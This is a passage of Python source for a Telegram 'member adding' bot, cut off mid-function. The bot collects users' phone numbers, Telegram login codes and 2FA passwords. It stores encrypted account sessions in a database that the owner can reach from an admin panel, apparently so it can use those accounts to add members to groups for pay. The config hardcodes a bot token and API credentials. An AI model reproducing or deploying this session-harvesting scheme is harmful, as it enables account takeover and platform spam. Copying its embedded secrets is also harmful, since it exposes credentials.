# ==========================================================
#   👑 PROFESSIONAL TELEGRAM BOT — FULL COLORED EDITION
#   Owner: @Ghost_Code_404  |  Channel: @ToolsByRehan
#   - All buttons in Reply Keyboard with colors
#   - Full features: accounts, orders, points, referrals
#   - No HTML parse errors
#   - Single instance lock
# ==========================================================
import sys, subprocess, importlib

for _pkg in ["aiogram==3.7.0", "telethon==1.36.0", "cryptography==42.0.8"]:
    _mod = _pkg.split("==")[0]
    try:
        importlib.import_module(_mod)
    except ImportError:
        print(f"📦 Installing {_pkg}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", _pkg])

import os, io, csv, sqlite3, datetime, logging, time, asyncio, socket
from aiogram import Bot, Dispatcher, F, types, BaseMiddleware
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    InlineKeyboardMarkup as IKM,
    InlineKeyboardButton as IKB,
    ReplyKeyboardMarkup as RKM,
    KeyboardButton as KB,
    BufferedInputFile,
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from cryptography.fernet import Fernet

# ==========================================================
#                    ⚙️ CONFIG
# ==========================================================
BOT_TOKEN        = os.getenv("BOT_TOKEN", "8781096796:AAGGfb-DLH1oH7YkdnqVxJKfnNL2EPsEf5o")
API_ID           = int(os.getenv("API_ID", "30217812"))
API_HASH         = os.getenv("API_HASH", "d21066a90786cf2dd348b907ece69d24")
OWNER_ID         = int(os.getenv("OWNER_ID", "8762845215"))
OWNER_GROUP_ID   = int(os.getenv("OWNER_GROUP_ID", "-1003975078444"))
CUSTOMER_SERVICE = "Ghost_Code_404"
CHANNEL_LINK     = "https://t.me/MR_GHOST_OFFICIAL"
CHANNEL_USERNAME = "@MR_GHOST_OFFICIAL"
FORCE_CHANNELS   = [CHANNEL_USERNAME]

DEFAULT_DELIVERY        = "24 to 48 hours"
DEFAULT_MEMBERS_PER_ACC = 5
REFERRAL_POINTS         = 100
POINTS_PER_MEMBER       = 2
TRIAL_MEMBERS           = 5
BACKUP_HOUR_UTC         = 3
FLOOD_LIMIT, FLOOD_WINDOW, FLOOD_MUTE_TIME = 8, 10, 300

OWNER_IDS = [OWNER_ID]; HELPERS = []
FLOOD_CACHE: dict = {}; FLOOD_MUTED: dict = {}

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s | %(levelname)s | %(message)s")

# ==========================================================
#          🔒 SINGLE-INSTANCE LOCK
# ==========================================================
LOCK_SOCKET = None

def acquire_single_instance_lock(port=45999):
    global LOCK_SOCKET
    try:
        LOCK_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        LOCK_SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        LOCK_SOCKET.bind(("127.0.0.1", port))
        LOCK_SOCKET.listen(1)
        logging.info("🔒 Single-instance lock acquired.")
        return True
    except OSError:
        logging.error("❌ Another instance is already running. Exiting.")
        sys.exit(1)

# ==========================================================
#                    🔑 FERNET KEY
# ==========================================================
_env = os.getenv("FERNET_KEY")
if _env:
    FERNET_KEY = _env.encode()
else:
    _kf = ".fernet_key"
    if os.path.exists(_kf):
        FERNET_KEY = open(_kf, "rb").read().strip()
    else:
        FERNET_KEY = Fernet.generate_key()
        try: open(_kf, "wb").write(FERNET_KEY)
        except Exception: pass
        logging.warning(f"NEW FERNET_KEY (save!): {FERNET_KEY.decode()}")
cipher = Fernet(FERNET_KEY)

# ==========================================================
#                    🤖 BOT SETUP
# ==========================================================
bot = Bot(token=BOT_TOKEN)      # No parse_mode — plain text only
dp  = Dispatcher(storage=MemoryStorage())
CLIENTS: dict = {}

# ==========================================================
#                    🌐 TRANSLATIONS
# ==========================================================
WELCOME = {
"en": ("✨ Welcome to ToolsByRehan Bot\n"
       "━━━━━━━━━━━━━━━━━━━━\n\n"
       "👋 Hello, {name}!\n\n"
       "Your complete Telegram Manager.\n\n"
       "💎 Link unlimited accounts\n"
       "🎯 Set target groups\n"
       "💰 Earn points and get members\n"
       "💳 Buy members anytime\n\n"
       "━━━━━━━━━━━━━━━━━━━━\n"
       "👇 Use the menu below"),
}

TEXTS = {
"en": {
 "menu_title":"🏠 MAIN MENU\n━━━━━━━━━━━━━━━━━━━━\n👇 Choose an option",
 "choose_language":"🌐 Select Language",
 "language_set":"✅ Language set to English",
 "add_title":"➕ ADD ACCOUNT",
 "add_guide":"📖 Send your Telegram phone number with country code.\n✍️ Example: +923001234567\n⚠️ Each number once.",
 "otp_guide":"📩 Code sent!\n✍️ Enter the code Telegram sent you.",
 "pwd_guide":"🔐 2FA Password\n✍️ Send your password.",
 "linked_ok":"✅ Account Added\n📱 {phone}",
 "phone_used":"❌ Number Already Linked\n{phone}",
 "target_title":"🎯 SET TARGET GROUP",
 "target_guide":"📖 Send group link where members should be added.\n✍️ Example: https://t.me/yourgroup",
 "target_saved":"✅ Target Saved\n🎯 {link}",
 "own_title":"🏠 SET YOUR GROUP",
 "own_guide":"📖 Send your own group link.\n✍️ Example: https://t.me/mygroups",
 "own_saved":"✅ Own Group Saved\n🏠 {link}",
 "my_title":"📊 MY ACCOUNTS","no_accounts":"❌ No accounts yet.",
 "submit_title":"📦 SUBMIT ORDER","submit_no_acc":"❌ No accounts linked.",
 "submit_incomplete":"⚠️ Not Ready\n\nSome accounts need target.",
 "history_title":"📜 HISTORY","history_empty":"❌ No orders yet.",
 "status_pending":"⏳ Pending","status_process":"🔄 Processing",
 "status_complete":"✅ Complete","status_rejected":"❌ Rejected",
 "members_title":"👥 MEMBER INFO",
 "members_body":"📊 Rates:\n• Paid: 1 acc = {rate} members\n• Free: {ppm} pts = 1 member\n\n📱 Accounts: {accounts}\n💰 Points: {points}",
 "help_title":"📖 HOW TO USE",
 "help_body":("📖 Step-by-Step Guide\n"
              "━━━━━━━━━━━━━━━━━━━━\n\n"
              "1. Add Account\nMy Accounts → Add New Account\nSend phone number with country code.\n\n"
              "2. Set Target Group\nMy Accounts → Set Target Group\nSend the group link where you want members.\n\n"
              "3. Set Your Group\nMy Accounts → Set Your Own Group\nFor receiving reports.\n\n"
              "4. Submit Order\nOrders → Submit New Order\nDelivery in 24–48 hours.\n\n"
              "Free Members\n• Refer friends → 100 points each\n• 2 points = 1 member\n• Orders → Free Order\n\n"
              "━━━━━━━━━━━━━━━━━━━━\n🛎 Support: @{support}"),
 "invalid_link":"❌ Invalid link.","invalid_phone":"❌ Invalid number.",
 "cancelled":"❌ Cancelled","banned":"🚫 Banned","rate_limited":"⏳ Slow down.",
 "ref_title":"🎁 REFER & EARN",
 "ref_body":"🔗 {link}\n\n💰 Points: {points}\n👥 Referrals: {refs}\n\n💡 Friend links first account → +{reward} pts",
 "ref_reward":"🎉 +{pts} Points!\n{name} linked first account.\n💰 Total: {total}",
 "new_ref_notice":"👋 Welcome! Referrer will get {pts} pts once you link your first account.",
 "points_title":"💰 MY POINTS",
 "points_body":"💰 Points: {points}\n💎 {ppm} pts = 1 member\n👥 Can order: {members} members",
 "free_title":"💎 FREE ORDER","free_intro":"📖 Send target group link:",
 "free_own":"✅ Now send your own group link:",
 "free_amount":"✅ How many members?\n💎 {ppm} pts per member\n💰 Your balance: {points}\n✍️ Example: 25",
 "free_no_points":"❌ Not Enough Points\n💰 You have: {points}\n💎 Need: {need}",
 "free_invalid_num":"❌ Send a number ≥ 1.",
 "free_confirm":"💎 Confirm Order\n👥 Members: {members}\n💰 Cost: {cost} pts\n💰 Remaining: {remaining}\n🎯 Target: {target}\n🏠 Own: {own}",
 "free_done":"🎉 Order Placed!\n👥 {members}\n💰 Used: {cost} pts\n💰 Left: {remaining}\n⏱ {time}",
 "btn_confirm":"✅  Confirm","btn_edit":"❌  Cancel",
 "ticket_title":"🎫 NEW TICKET","ticket_guide":"✍️ Describe your issue.",
 "ticket_sent":"✅ Ticket #{id} sent.",
 "coupon_prompt":"🎟 Redeem Coupon\n\nSend: /redeem YOURCODE",
 "buy_title":"💳 BUY MEMBERS",
 "buy_body":"💎 How to buy:\n━━━━━━━━━━━━━━━━━━━━\n\n1️⃣ Contact our support\n2️⃣ Send payment\n3️⃣ Points added to your account\n4️⃣ Order members instantly\n\n💰 Rate: {ppm} pts = 1 member\n\n🎯 You receive:\n• Real Telegram members\n• Fast delivery\n• 100% safe\n\n🛎 Support: @{support}",
 "owner_msg_status":"📢 Order Update\n#{id}: {status}\n💬 {note}",
 "owner_msg_custom":"📩 Message from Support\n\n{msg}",
},
}

def t(lang, key, **kw):
    lang = lang if lang in TEXTS else "en"
    text = TEXTS[lang].get(key, TEXTS["en"].get(key, key))
    try: return text.format(**kw) if kw else text
    except Exception: return text

def get_welcome(lang, name):
    tmpl = WELCOME.get(lang, WELCOME["en"])
    try: return tmpl.format(name=name)
    except Exception: return tmpl

# ==========================================================
#                    💾 DATABASE
# ==========================================================
conn = sqlite3.connect("data.db", check_same_thread=False)
conn.executescript("""
CREATE TABLE IF NOT EXISTS users(
    user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
    lang TEXT DEFAULT 'en', banned INTEGER DEFAULT 0, joined_at TEXT,
    referred_by INTEGER DEFAULT NULL, referral_rewarded INTEGER DEFAULT 0,
    points INTEGER DEFAULT 0, ref_count INTEGER DEFAULT 0,
    is_vip INTEGER DEFAULT 0, vip_until TEXT,
    target_link TEXT, own_link TEXT);
CREATE TABLE IF NOT EXISTS accounts(
    id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
    phone TEXT UNIQUE, session_enc BLOB,
    target_link TEXT, own_link TEXT, created_at TEXT);
CREATE TABLE IF NOT EXISTS orders(
    id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
    accounts INTEGER, members INTEGER, order_type TEXT DEFAULT 'paid',
    points_used INTEGER DEFAULT 0, is_trial INTEGER DEFAULT 0,
    priority INTEGER DEFAULT 0, status TEXT DEFAULT 'pending',
    note TEXT, created_at TEXT, updated_at TEXT);
CREATE TABLE IF NOT EXISTS settings(key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE IF NOT EXISTS tickets(
    id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, message TEXT,
    reply TEXT, status TEXT DEFAULT 'open', created_at TEXT, replied_at TEXT);
CREATE TABLE IF NOT EXISTS logs(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER, action TEXT, detail TEXT, created_at TEXT);
CREATE TABLE IF NOT EXISTS owners(
    user_id INTEGER PRIMARY KEY, role TEXT DEFAULT 'helper',
    added_at TEXT, added_by INTEGER);
CREATE TABLE IF NOT EXISTS coupons(
    code TEXT PRIMARY KEY, points INTEGER,
    max_uses INTEGER DEFAULT 1, uses INTEGER DEFAULT 0,
    expires_at TEXT, created_at TEXT);
CREATE TABLE IF NOT EXISTS coupon_uses(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    code TEXT, user_id INTEGER, used_at TEXT);
CREATE TABLE IF NOT EXISTS trial_used(
    user_id INTEGER PRIMARY KEY, used_at TEXT);
""")
conn.commit()

for sql in ["ALTER TABLE users ADD COLUMN points INTEGER DEFAULT 0",
            "ALTER TABLE users ADD COLUMN ref_count INTEGER DEFAULT 0",
            "ALTER TABLE users ADD COLUMN is_vip INTEGER DEFAULT 0",
            "ALTER TABLE users ADD COLUMN vip_until TEXT",
            "ALTER TABLE users ADD COLUMN target_link TEXT",
            "ALTER TABLE users ADD COLUMN own_link TEXT",
            "ALTER TABLE orders ADD COLUMN is_trial INTEGER DEFAULT 0",
            "ALTER TABLE orders ADD COLUMN priority INTEGER DEFAULT 0"]:
    try: conn.execute(sql); conn.commit()
    except sqlite3.OperationalError: pass

def now_str(): return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
def get_setting(k, d=None):
    r = conn.execute("SELECT value FROM settings WHERE key=?",(k,)).fetchone()
    return r[0] if r else d
def set_setting(k, v):
    conn.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)",(k,v)); conn.commit()
def get_lang(uid):
    r = conn.execute("SELECT lang FROM users WHERE user_id=?",(uid,)).fetchone()
    return (r[0] if r and r[0] else "en")
def set_lang(uid, lg):
    conn.execute("UPDATE users SET lang=? WHERE user_id=?",(lg,uid)); conn.commit()
def is_banned(uid):
    r = conn.execute("SELECT banned FROM users WHERE user_id=?",(uid,)).fetchone()
    return bool(r and r[0])
def log_action(uid, a, d=""):
    conn.execute("INSERT INTO logs(user_id,action,detail,created_at) VALUES(?,?,?,?)",
                 (uid,a,d,now_str())); conn.commit()
def members_per_account():
    try: return int(get_setting("members_per_account", DEFAULT_MEMBERS_PER_ACC))
    except Exception: return DEFAULT_MEMBERS_PER_ACC
def get_points(uid):
    r = conn.execute("SELECT points FROM users WHERE user_id=?",(uid,)).fetchone()
    return int(r[0]) if r and r[0] else 0
def add_points(uid, n):
    conn.execute("UPDATE users SET points=points+? WHERE user_id=?",(n,uid)); conn.commit()
def get_ref_count(uid):
    r = conn.execute("SELECT ref_count FROM users WHERE user_id=?",(uid,)).fetchone()
    return int(r[0]) if r and r[0] else 0
def is_vip(uid):
    r = conn.execute("SELECT is_vip,vip_until FROM users WHERE user_id=?",(uid,)).fetchone()
    if not r or not r[0]: return False
    if r[1]:
        try:
            if datetime.datetime.strptime(r[1], "%Y-%m-%d") < datetime.datetime.now():
                conn.execute("UPDATE users SET is_vip=0 WHERE user_id=?",(uid,))
                conn.commit(); return False
        except Exception: pass
    return True
def trial_available(uid):
    r = conn.execute("SELECT user_id FROM trial_used WHERE user_id=?",(uid,)).fetchone()
    return r is None
def status_label(lg, st):
    return {"pending":t(lg,"status_pending"),"process":t(lg,"status_process"),
            "complete":t(lg,"status_complete"),"rejected":t(lg,"status_rejected")}.get(st,st)
def is_owner(uid): return uid in OWNER_IDS
def is_helper(uid): return uid in HELPERS or is_owner(uid)

# ==========================================================
#                    FSM
# ==========================================================
class AddAcc(StatesGroup):
    phone=State(); otp=State(); password=State()
class SetLinks(StatesGroup):
    target=State(); own=State()
class FreeOrder(StatesGroup):
    target=State(); own=State(); amount=State(); confirm=State()
class AdminFlow(StatesGroup):
    broadcast=State(); find_user=State(); msg_user=State(); status_note=State()
class TicketFlow(StatesGroup):
    message=State(); reply=State()

# ==========================================================
#     🎨 REPLY KEYBOARDS — Colored Main & Sub Menus
# ==========================================================

def main_reply_kb():
    return RKM(
        keyboard=[
            [KB(text="📱 My Accounts", style="primary"),
             KB(text="📦 Orders", style="success")],
            [KB(text="💰 Wallet", style="success"),
             KB(text="🎁 Refer & Earn", style="success")],
            [KB(text="🛎 Support", style="primary"),
             KB(text="⚙️ Settings", style="primary")],
            [KB(text="📖 Guide", style="primary")],
        ],
        resize_keyboard=True,
        is_persistent=True,
        input_field_placeholder="Choose from menu below...",
    )

def accounts_reply_kb():
    return RKM(
        keyboard=[
            [KB(text="🟢 Add New Account",     style="success"),
             KB(text="🔵 View All Accounts",   style="primary")],
            [KB(text="🟡 Set Target Group",    style="primary"),
             KB(text="🟠 Set Own Group",       style="primary")],
            [KB(text="⚪ Back to Menu",         style="primary")],
        ],
        resize_keyboard=True,
        is_persistent=True,
    )

def orders_reply_kb(uid=None):
    rows = [
        [KB(text="🟢 Submit Paid Order",   style="success"),
         KB(text="🔵 Free Order (Points)", style="primary")],
    ]
    if uid and trial_available(uid):
        rows.append([KB(text="🟣 Free Trial (5 members)", style="primary")])
    rows.append([KB(text="📜 Order History", style="primary"),
                 KB(text="⚪ Back to Menu",   style="primary")])
    return RKM(
        keyboard=rows,
        resize_keyboard=True,
        is_persistent=True,
    )

def wallet_reply_kb():
    return RKM(
        keyboard=[
            [KB(text="🟢 Buy Members",     style="success"),
             KB(text="🟣 Refer & Earn",    style="primary")],
            [KB(text="🟡 My Points",       style="primary"),
             KB(text="🟠 Redeem Coupon",   style="primary")],
            [KB(text="⚪ Back to Menu",     style="primary")],
        ],
        resize_keyboard=True,
        is_persistent=True,
    )

def support_reply_kb():
    return RKM(
        keyboard=[
            [KB(text="🟠 Contact Support", style="primary"),
             KB(text="🔵 Our Channel",     style="primary")],
            [KB(text="🟣 New Ticket",      style="primary")],
            [KB(text="⚪ Back to Menu",     style="primary")],
        ],
        resize_keyboard=True,
        is_persistent=True,
    )

def settings_reply_kb():
    return RKM(
        keyboard=[
            [KB(text="🔵 Change Language", style="primary"),
             KB(text="🔵 My Profile",       style="primary")],
            [KB(text="🔵 My Statistics",   style="primary")],
            [KB(text="⚪ Back to Menu",     style="primary")],
        ],
        resize_keyboard=True,
        is_persistent=True,
    )

def cancel_reply_kb():
    return RKM(
        keyboard=[[KB(text="🔴 Cancel", style="danger")]],
        resize_keyboard=True,
        is_persistent=True,
    )

# ==========================================================
#     🎨 INLINE KEYBOARDS — For dialogs, confirms, owner panel
# ==========================================================
def lang_kb():
    return IKM(inline_keyboard=[
        [IKB(text="🇬🇧 English",       callback_data="setlang:en")],
        [IKB(text="🇵🇰 اردو",           callback_data="setlang:ur")],
        [IKB(text="🇮🇳 हिंदी",          callback_data="setlang:hi")],
        [IKB(text="🔤 Roman Urdu",     callback_data="setlang:rom_ur")],
        [IKB(text="🇸🇦 العربية",        callback_data="setlang:ar")],
    ])

def free_confirm_kb(lang):
    return IKM(inline_keyboard=[
        [IKB(text="🟢 Confirm Order", callback_data="free_yes")],
        [IKB(text="🔴 Cancel",         callback_data="free_no")],
    ])

def owner_menu():
    return IKM(inline_keyboard=[
        [IKB(text="📦 Orders",    callback_data="o_orders"),
         IKB(text="📋 Queue",     callback_data="o_queue")],
        [IKB(text="👥 Users",     callback_data="o_users"),
         IKB(text="📊 Stats",     callback_data="o_stats")],
        [IKB(text="📈 Analytics", callback_data="o_analytics")],
        [IKB(text="🔑 Sessions",  callback_data="o_sessions")],
        [IKB(text="✉️ Message",   callback_data="o_msg_user"),
         IKB(text="📢 Broadcast", callback_data="o_broadcast")],
        [IKB(text="🎫 Tickets",   callback_data="o_tickets"),
         IKB(text="🎟 Coupons",   callback_data="o_coupons")],
        [IKB(text="💾 Backup",    callback_data="o_backup"),
         IKB(text="📤 Export",    callback_data="o_export")],
        [IKB(text="⚙️ Settings",  callback_data="o_settings")],
    ])

def order_status_kb(oid):
    return IKM(inline_keyboard=[
        [IKB(text="⏳ Pending",     callback_data=f"setst:{oid}:pending"),
         IKB(text="🔄 Processing",  callback_data=f"setst:{oid}:process")],
        [IKB(text="✅ Complete",    callback_data=f"setst:{oid}:complete"),
         IKB(text="❌ Reject",      callback_data=f"setst:{oid}:rejected")],
        [IKB(text="✉️ Message User", callback_data=f"ordmsg:{oid}")],
        [IKB(text="🔙 Back",         callback_data="o_orders")],
    ])

def admin_back_kb():
    return IKM(inline_keyboard=[[IKB(text="🔙 Admin Panel", callback_data="admin_home")]])

def force_join_kb(missing):
    return IKM(inline_keyboard=[
        [IKB(text="📢 Join Our Channel", url=CHANNEL_LINK)],
        [IKB(text="✅ Verify & Continue", callback_data="verify_join")],
    ])

def user_tag(u): return f"@{u.username}" if u.username else str(u.id)

# ==========================================================
#                    HELPERS
# ==========================================================
async def check_force_join(uid):
    if not FORCE_CHANNELS: return []
    missing = []
    for ch in FORCE_CHANNELS:
        try:
            m = await bot.get_chat_member(ch, uid)
            if m.status in ("left","kicked"): missing.append(ch)
        except Exception: missing.append(ch)
    return missing

def save_referral_on_start(new_uid, ref_uid):
    if new_uid == ref_uid: return
    ex = conn.execute("SELECT referred_by FROM users WHERE user_id=?",(new_uid,)).fetchone()
    if ex and ex[0]: return
    conn.execute("UPDATE users SET referred_by=? WHERE user_id=?",(ref_uid,new_uid))
    conn.commit()

def reward_referrer_if_due(uid):
    u = conn.execute("SELECT referred_by,referral_rewarded FROM users WHERE user_id=?",(uid,)).fetchone()
    if not u or not u[0]: return None
    ref_uid, already = u
    if already: return None
    cnt = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?",(uid,)).fetchone()[0]
    if cnt < 1: return None
    add_points(ref_uid, REFERRAL_POINTS)
    conn.execute("UPDATE users SET ref_count=ref_count+1 WHERE user_id=?",(ref_uid,))
    conn.execute("UPDATE users SET referral_rewarded=1 WHERE user_id=?",(uid,))
    conn.commit()
    return ref_uid

# ==========================================================
#                    🛡 MIDDLEWARES
# ==========================================================
class AntiFloodMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        fu = getattr(event, "from_user", None)
        uid = fu.id if fu else None
        if not uid or is_helper(uid): return await handler(event, data)
        mute_until = FLOOD_MUTED.get(uid, 0)
        if time.time() < mute_until:
            if isinstance(event, types.Message):
                try: await event.answer(f"🚫 Slow down! Wait {int(mute_until-time.time())}s")
                except Exception: pass
            return
        now = time.time()
        FLOOD_CACHE.setdefault(uid, [])
        FLOOD_CACHE[uid] = [x for x in FLOOD_CACHE[uid] if now - x < FLOOD_WINDOW]
        FLOOD_CACHE[uid].append(now)
        if len(FLOOD_CACHE[uid]) > FLOOD_LIMIT:
            FLOOD_MUTED[uid] = now + FLOOD_MUTE_TIME
            FLOOD_CACHE[uid] = []
            if isinstance(event, types.Message):
                try: await event.answer("🚫 Too fast! Muted 5 min.")
                except Exception: pass
            return
        return await handler(event, data)

class ForceJoinMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        fu = getattr(event, "from_user", None)
        uid = fu.id if fu else None
        if not uid or is_helper(uid): return await handler(event, data)
        if isinstance(event, types.CallbackQuery):
            if event.data in ("verify_join",) or (event.data or "").startswith("setlang:"):
                return await handler(event, data)
        if isinstance(event, types.Message):
            if event.text and event.text.startswith("/start"):
                return await handler(event, data)
        missing = await check_force_join(uid)
        if missing:
            if isinstance(event, types.CallbackQuery):
                await event.answer("🔒 Pehle channel join karein! /start dabayein.", show_alert=True)
                return
            else:
                try: await event.answer("🔒 Pehle channel join karein!", reply_markup=force_join_kb(missing))
                except Exception: pass
                return
        return await handler(event, data)

dp.message.middleware(AntiFloodMiddleware())
dp.callback_query.middleware(AntiFloodMiddleware())
dp.message.middleware(ForceJoinMiddleware())
dp.callback_query.middleware(ForceJoinMiddleware())

# ==========================================================
#                    🏁 /start
# ==========================================================
@dp.message(Command("start"))
async def cmd_start(m: types.Message, state: FSMContext):
    await state.clear()
    if is_banned(m.from_user.id):
        await m.answer(t(get_lang(m.from_user.id), "banned")); return
    conn.execute("INSERT OR IGNORE INTO users(user_id,username,first_name,lang,joined_at) "
                 "VALUES(?,?,?,?,?)",
                 (m.from_user.id, m.from_user.username or "",
                  m.from_user.first_name or "", "en", now_str()))
    conn.commit()
    parts = (m.text or "").split()
    if len(parts) > 1 and parts[1].startswith("ref_"):
        try: save_referral_on_start(m.from_user.id, int(parts[1][4:]))
        except Exception: pass
    lg = get_lang(m.from_user.id)
    welcome = get_welcome(lg, m.from_user.first_name)
    missing = await check_force_join(m.from_user.id)
    if missing:
        await m.answer(
            welcome + "\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🔒 Channel Join Required\n\n"
            "Please join our channel to use this bot.\n"
            "Then tap Verify button below.",
            reply_markup=force_join_kb(missing))
        return
    await m.answer(
        welcome + "\n\n" + t(lg,"menu_title"),
        reply_markup=main_reply_kb())

@dp.callback_query(F.data == "verify_join")
async def verify_join(c: types.CallbackQuery):
    missing = await check_force_join(c.from_user.id)
    if missing:
        await c.answer("❌ Pehle channel join karein!", show_alert=True); return
    lg = get_lang(c.from_user.id)
    welcome = get_welcome(lg, c.from_user.first_name)
    try:
        await c.message.edit_text("✅ Verified!")
    except Exception: pass
    await c.message.answer(
        welcome + "\n\n" + t(lg,"menu_title"),
        reply_markup=main_reply_kb())
    await c.answer("✅")

@dp.callback_query(F.data.startswith("setlang:"))
async def set_language(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    lg = c.data.split(":")[1]
    if lg not in TEXTS: lg = "en"
    set_lang(c.from_user.id, lg)
    welcome = get_welcome(lg, c.from_user.first_name)
    try:
        await c.message.edit_text(f"✅ {t(lg,'language_set')}\n\n{welcome}")
    except Exception: pass
    await c.message.answer(t(lg,"menu_title"), reply_markup=main_reply_kb())
    await c.answer("✅")

@dp.message(Command("menu"))
async def cmd_menu(m: types.Message, state: FSMContext):
    await state.clear()
    lg = get_lang(m.from_user.id)
    await m.answer(t(lg,"menu_title"), reply_markup=main_reply_kb())

@dp.message(Command("lang"))
async def cmd_lang(m: types.Message):
    await m.answer(t(get_lang(m.from_user.id),"choose_language"), reply_markup=lang_kb())

# ==========================================================
#     📱 MAIN MENU — Reply Keyboard Handlers
# ==========================================================
@dp.message(F.text == "📱 My Accounts")
async def rk_accounts(m: types.Message):
    accs = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?", (m.from_user.id,)).fetchone()[0]
    tgt = conn.execute("SELECT target_link FROM users WHERE user_id=?", (m.from_user.id,)).fetchone()
    own = conn.execute("SELECT own_link FROM users WHERE user_id=?", (m.from_user.id,)).fetchone()
    target_set = "✅ Set" if (tgt and tgt[0]) else "❌ Not Set"
    own_set = "✅ Set" if (own and own[0]) else "❌ Not Set"
    await m.answer(
        f"📱 My Accounts\n━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Linked accounts: {accs}\n"
        f"🎯 Target group: {target_set}\n"
        f"🏠 Own group: {own_set}\n\n"
        f"👇 Choose an option below:",
        reply_markup=accounts_reply_kb())

@dp.message(F.text == "📦 Orders")
async def rk_orders(m: types.Message):
    await m.answer(
        "📦 Orders\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "📦 Submit new orders or view your history.\n\n"
        "🟢 Paid Order — uses your accounts\n"
        "🔵 Free Order — uses your points\n\n"
        "👇 Choose an option below:",
        reply_markup=orders_reply_kb(m.from_user.id))

@dp.message(F.text == "💰 Wallet")
async def rk_wallet(m: types.Message):
    pts = get_points(m.from_user.id)
    members = pts // POINTS_PER_MEMBER
    await m.answer(
        f"💰 Wallet & Points\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💰 Balance: {pts} points\n"
        f"👥 Equals: {members} members\n"
        f"💎 Rate: {POINTS_PER_MEMBER} pts = 1 member\n\n"
        f"👇 Choose an option below:",
        reply_markup=wallet_reply_kb())

@dp.message(F.text == "🎁 Refer & Earn")
async def rk_refer_main(m: types.Message):
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start=ref_{m.from_user.id}"
    pts = get_points(m.from_user.id); refs = get_ref_count(m.from_user.id)
    await m.answer(
        f"🎁 Refer & Earn\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔗 {link}\n\n"
        f"💰 Points: {pts}\n👥 Referrals: {refs}\n\n"
        f"💡 Friend links first account → +{REFERRAL_POINTS} pts",
        reply_markup=main_reply_kb())

@dp.message(F.text == "🛎 Support")
async def rk_support(m: types.Message):
    await m.answer(
        "🛎 Support & Help\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "Our team is here to help:\n"
        "• Order issues\n• Payments\n• General questions\n\n"
        "Typical response: within a few hours\n\n"
        "👇 Choose an option below:",
        reply_markup=support_reply_kb())

@dp.message(F.text == "⚙️ Settings")
async def rk_settings(m: types.Message):
    await m.answer(
        "⚙️ Settings\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 Choose an option below:",
        reply_markup=settings_reply_kb())

@dp.message(F.text == "📖 Guide")
async def rk_guide(m: types.Message):
    lg = get_lang(m.from_user.id)
    await m.answer(
        f"{t(lg,'help_title')}\n━━━━━━━━━━━━━━━━━━━━\n\n"
        + t(lg,"help_body", support=CUSTOMER_SERVICE),
        reply_markup=main_reply_kb())

# ==========================================================
#     📱 ACCOUNTS SUB-MENU
# ==========================================================
@dp.message(F.text == "🟢 Add New Account")
async def rk_add_account(m: types.Message, state: FSMContext):
    if is_banned(m.from_user.id):
        await m.answer("🚫 Banned"); return
    lg = get_lang(m.from_user.id)
    await state.set_state(AddAcc.phone)
    await m.answer(
        f"{t(lg,'add_title')}\n━━━━━━━━━━━━━━━━━━━━\n\n{t(lg,'add_guide')}",
        reply_markup=cancel_reply_kb())

@dp.message(F.text == "🔵 View All Accounts")
async def rk_view_accounts(m: types.Message):
    rows = conn.execute("SELECT id,phone,target_link,own_link FROM accounts "
                        "WHERE user_id=? ORDER BY id",(m.from_user.id,)).fetchall()
    if not rows:
        await m.answer("❌ No accounts linked yet.\n\nPress Add New Account to start.",
                       reply_markup=accounts_reply_kb())
        return
    ready = sum(1 for r in rows if r[2])
    pts = get_points(m.from_user.id)
    text = (f"📊 My Accounts\n━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 Total: {len(rows)}\n✅ Ready: {ready}\n"
            f"💰 Points: {pts}\n\n")
    for i, (aid, phone, tgt, own) in enumerate(rows, 1):
        text += (f"#{i} 📱 {phone}\n"
                 f"   🎯 {tgt or '—'}\n   🏠 {own or '—'}\n\n")
    if len(text) > 4000: text = text[:3990] + "\n..."
    await m.answer(text, reply_markup=accounts_reply_kb())

@dp.message(F.text == "🟡 Set Target Group")
async def rk_set_target(m: types.Message, state: FSMContext):
    accs = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?", (m.from_user.id,)).fetchone()[0]
    if accs < 1:
        await m.answer("❌ Pehle account link karein!", reply_markup=accounts_reply_kb()); return
    await state.set_state(SetLinks.target)
    await m.answer(
        "🎯 Set Target Group\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send the Telegram group link where you want members added.\n\n"
        "Example:\nhttps://t.me/yourgroup",
        reply_markup=cancel_reply_kb())

@dp.message(F.text == "🟠 Set Own Group")
async def rk_set_own(m: types.Message, state: FSMContext):
    accs = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?", (m.from_user.id,)).fetchone()[0]
    if accs < 1:
